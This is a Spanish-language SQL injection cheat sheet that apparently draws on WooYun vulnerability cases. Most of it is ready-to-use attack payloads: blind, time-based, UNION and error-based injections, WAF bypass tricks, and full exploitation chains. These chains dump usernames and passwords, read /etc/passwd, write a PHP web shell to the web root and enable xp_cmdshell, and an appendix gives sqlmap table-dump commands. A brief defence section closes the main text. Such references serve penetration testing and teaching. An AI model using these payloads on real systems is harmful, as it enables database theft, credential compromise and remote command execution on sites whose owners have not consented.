# Seguridad Web - Inyección SQL

> Fuente: Base de datos de vulnerabilidades WooYun (27,732 casos de inyección SQL) | Extraído de web-injection.md

## I. Inyección SQL

### 1.1 Naturaleza de la vulnerabilidad

```
Falta de validación de entrada → Concatenación dinámica de SQL → Ruptura del límite semántico → Ejecución de instrucciones de base de datos
```

**Fórmula central**: Inyección SQL = Confusión del límite entre código y datos + Entrada del usuario elevada a instrucción SQL ejecutable

### 1.2 Métodos de detección

#### Identificación de puntos de inyección de alto riesgo

| Tipo de vector | Porcentaje | Escenario típico |
|---------|------|---------|
| Formulario de login | 66% | Concatenación directa de usuario/contraseña |
| Cuadro de búsqueda | 64% | Coincidencia difusa con sentencia LIKE |
| Parámetros POST | 60% | Envío de formularios |
| Cabeceras HTTP | 26% | UA/Referer/XFF |
| Parámetros GET | 24% | Parámetros de URL |
| Cookie | 12% | Manejo del identificador de sesión |

**Nombres de parámetros frecuentes**: `id`, `sort_id`, `username`, `password`, `type`, `action`, `page`, `name`; específicos de ASP.NET: `__viewstate`, `__eventvalidation`

#### Flujo rápido de detección

```
1. Prueba con comilla simple/doble → Observar errores
2. Operación matemática: id=2-1 / id=1*1 → Observar equivalencia
3. Prueba booleana: and 1=1 / and 1=2 → Comparar diferencias en la respuesta
4. Retardo temporal: and sleep(5) → Observar el tiempo de respuesta
5. Sondeo de columnas por orden: order by N → Incrementar hasta obtener error
```

#### Identificación de huella digital de base de datos

| Base de datos | Función de retardo | Tabla del sistema | Característica del error |
|-------|---------|-------|---------|
| MySQL | `sleep(N)` / `benchmark()` | `information_schema.tables` | "You have an error in your SQL syntax" |
| MSSQL | `WAITFOR DELAY '0:0:N'` | `sysobjects` | "Unclosed quotation mark" |
| Oracle | `dbms_pipe.receive_message('a',N)` | `all_tables` | "ORA-00942" |
| Access | Retardo por producto cartesiano | `MSysObjects` | "Microsoft JET Database Engine" |

### 1.3 Técnicas de inyección y Payloads

#### Inyección booleana ciega (blind)

```sql
id=1 AND 1=1    -- True
id=1 AND 1=2    -- False
id=1' AND '1'='1
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- MySQL RLIKE
id=8 RLIKE (SELECT (CASE WHEN (7706=7706) THEN 8 ELSE 0x28 END))
```

#### Inyección basada en tiempo (blind)

```sql
-- MySQL (técnica práctica de retardo anidado)
id=(select(2)from(select(sleep(8)))v)
id=(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
-- MSSQL
id=1; WAITFOR DELAY '0:0:5'--
-- Oracle
id=1 AND dbms_pipe.receive_message('a',5)=1
```

#### Consultas UNION

```sql
id=1 ORDER BY N--              -- Sondeo del número de columnas
id=-1 UNION SELECT 1,2,3,4,5--  -- Determinar la posición reflejada
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Inyección basada en errores

```sql
-- MySQL extractvalue/updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MySQL floor
id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
-- Función CHAR para evadir el filtrado de caracteres
' AND 4329=CONVERT(INT,(SELECT CHAR(113)+CHAR(113)+(SELECT CHAR(49))+CHAR(113))) AND 'a'='a
```

### 1.4 Técnicas de bypass de WAF/filtros

#### Comentarios en línea (el más usado)

```sql
/*!50000union*//*!50000select*/1,2,3
/*!UNION*//*!SELECT*/1,2,3
-- Ejemplo de bypass en DeDeCMS
/*!50000Union*/+/*!50000SeLect*/+1,2,3,concat(0x7C,userid,0x3a,pwd,0x7C),5,6,7,8,9+from+`#@__admin`#
```

#### Bypass mediante codificación

```sql
-- Hexadecimal: 'admin' -> 0x61646d696e
SELECT * FROM users WHERE name=0x61646d696e
-- Doble codificación URL: %252f -> / , %2527 -> '
-- Unicode: %u0027 -> '
```

#### Sustitución de mayúsculas/minúsculas + espacios en blanco

```sql
UnIoN SeLeCt                    -- Confusión de mayúsculas/minúsculas
UNION/**/SELECT/**/1,2,3        -- Comentarios en lugar de espacios
UNION%09SELECT                  -- Sustitución por tabulación
UNION%0ASELECT                  -- Sustitución por salto de línea
```

#### Sustitución de funciones

```sql
SUBSTRING -> MID / SUBSTR / LEFT / RIGHT
CONCAT -> CONCAT_WS / ||
CHAR(65) -> carácter A
```

#### Sustitución lógica equivalente

```sql
AND 1=1 -> && 1=1 -> & 1
OR 1=1  -> || 1=1 -> | 1
id=1 -> id LIKE 1 / id BETWEEN 1 AND 1 / id IN(1) / id REGEXP '^1$'
-- Bypass de comillas
'admin' -> CHAR(97,100,109,105,110) -> 0x61646d696e
```

#### Inyección de byte ancho (codificación GBK)

```
%bf%27 evade addslashes()   -- En GBK, los caracteres multibyte absorben la barra invertida
```

#### Bypass a nivel HTTP

```
Contaminación de parámetros: id=1&id=2             -- Confusión mediante parámetros duplicados
Transferencia fragmentada: Transfer-Encoding: chunked
Inyección en X-Forwarded-For / Inyección en Cookie  -- Puntos de inyección no convencionales
```

### 1.5 Cadenas de explotación

#### Cadena de explotación completa en MySQL

```sql
-- 1.Información -> 2.Base de datos -> 3.Tabla -> 4.Columna -> 5.Datos -> 6.Archivo -> 7.Shell
union select 1,database(),version(),user(),5--
union select 1,group_concat(schema_name),3 from information_schema.schemata--
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--
union select 1,group_concat(username,0x3a,password),3 from users--
union select 1,load_file('/etc/passwd'),3--
union select 1,'<?php @system($_POST[cmd]);?>',3 into outfile '/var/www/html/shell.php'--
```

#### Cadena de explotación completa en MSSQL

```sql
union select 1,@@version,db_name(),system_user,5--
union select 1,name,3 from master..sysdatabases--
union select 1,name,3 from sysobjects where xtype='U'--
union select 1,username+':'+password,3 from users--
-- Ejecución de comandos (requiere permisos sa)
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
exec master..xp_cmdshell 'whoami'--
```

#### Cadena de explotación en Oracle

```sql
union select banner,null from v$version where rownum=1--
union select table_name,null from all_tables where rownum<=10--
union select username||':'||password,null from users--
```

#### Cadena de explotación de inyección ciega en Access

```sql
-- Sin information_schema, es necesario obtener el código fuente o adivinar los nombres de tabla
id=8 AND (SELECT TOP 1 LEN(username) FROM C_User) > 5
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User)) = 97
-- Para enumerar múltiples usuarios, usar NOT IN
id=8 AND ASCII((SELECT TOP 1 MID(username,1,1) FROM C_User WHERE id NOT IN (SELECT TOP 1 id FROM C_User))) > 97
```

### 1.6 Medidas de defensa

```python
# Consultas parametrizadas (opción preferida)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))  # Python
```

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");        // PHP PDO
```

```java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?"); // Java
```

- Consultas parametrizadas/sentencias precompiladas (opción preferida), procedimientos almacenados (opción secundaria)
- Validación de entrada por lista blanca + conversión forzada de tipo para parámetros numéricos
- Privilegios mínimos en la base de datos + ocultamiento de mensajes de error + despliegue de WAF

---


---

## Anexo: Referencia rápida de SQLMap

```bash
# Detección básica
sqlmap -u "http://t/p.php?id=1" --batch
# Petición POST
sqlmap -u "http://t/login.php" --data="user=t&pass=t" --batch
# Inyección vía Cookie/cabecera HTTP
sqlmap -u "http://t/p.php" --cookie="id=1" --level=2 --batch
sqlmap -u "http://t/p.php" --headers="X-Forwarded-For: 1" --level=3 --batch
# Bypass de WAF
sqlmap -u "http://t/p.php?id=1" --tamper=space2comment,between --batch
# Cadena de extracción de datos
sqlmap ... --dbs
sqlmap ... -D db --tables
sqlmap ... -D db -T tbl --columns
sqlmap ... -D db -T tbl -C c1,c2 --dump
```
